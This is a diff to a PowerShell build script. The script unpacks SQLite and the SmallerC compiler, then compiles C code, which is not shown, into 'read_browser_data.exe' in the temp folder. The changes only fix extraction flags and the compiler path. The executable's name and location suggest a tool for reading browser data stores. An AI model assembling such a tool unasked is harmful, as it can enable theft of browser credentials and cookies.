@@ -17,7 +17,7 @@ if (-Not (Test-Path -Path $sqliteExtractPath)) {
 
 # Extract the SQLite ZIP file
 Write-Output "Extracting SQLite source..."
-Expand-Archive -Path $zipFilePath -DestinationPath $sqliteExtractPath
+Expand-Archive -Path $zipFilePath -DestinationPath $sqliteExtractPath -Force
 
 # Clean up SQLite ZIP file
 Remove-Item -Path $zipFilePath
@@ -33,7 +33,7 @@ if (-Not (Test-Path -Path $smallerCExtractPath)) {
 
 # Extract the SmallerC ZIP file
 Write-Output "Extracting SmallerC..."
-Expand-Archive -Path $smallerCZipPath -DestinationPath $smallerCExtractPath
+Expand-Archive -Path $smallerCZipPath -DestinationPath $smallerCExtractPath -Force
 
 # Clean up SmallerC ZIP file
 Remove-Item -Path $smallerCZipPath
@@ -150,8 +150,8 @@ Set-Content -Path $cFilePath -Value $cCode
 
 # Compile the C code using SmallerC
 Write-Output "Compiling the C code..."
-cd "$smallerCExtractPath\SmallerC-master"
-.\bin\smc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
+cd "$smallerCExtractPath\SmallerC-master\v0100\bind"
+.\smlrc.exe -o "$env:TEMP\read_browser_data.exe" $cFilePath
 
 Write-Output "Compilation completed successfully!"
 
